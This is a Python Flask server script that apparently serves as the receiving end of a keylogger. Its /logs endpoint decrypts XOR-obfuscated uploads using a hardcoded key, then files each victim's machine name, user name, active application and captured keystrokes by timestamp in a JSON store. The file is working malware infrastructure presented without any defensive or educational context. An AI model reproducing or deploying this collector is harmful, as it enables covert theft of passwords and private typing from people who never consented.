import json
from flask import Flask, request, render_template

def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
    key: bytes = key.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

app = Flask(__name__, template_folder='templates', static_folder='static')

with open('server/static/json/data.json', 'r+') as file:
    json_data = json.load(file)

@app.route('/')
def index():
    return 'hello world'

@app.route('/logs', methods=['POST'])
def logs():
    if request.method == 'POST':
        data: str = decrypt_data(request.data).decode()
        data_dict: dict = json.loads(data)
        print(data_dict)

        computer_name = data_dict['computer_name']
        user_name = data_dict['user_name']
        active_app = data_dict['active_app']
        keys = data_dict['keys']
        timestamp = data_dict['timestamp']
        
        if computer_name in json_data.keys():
            if user_name in json_data[computer_name].keys():
                if active_app in json_data[computer_name][user_name].keys():
                    json_data[computer_name][user_name][active_app][timestamp] = keys
                else:
                    json_data[computer_name][user_name][active_app] = {timestamp: keys}
            else:
                json_data[computer_name][user_name] = {active_app: {timestamp: keys}}
        else:
            json_data[computer_name] = {user_name: {active_app: {timestamp: keys}}}

        with open('server/static/json/data.json', 'w') as file:
            json.dump(json_data, file, indent=4)

        return data

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5556, debug=True)
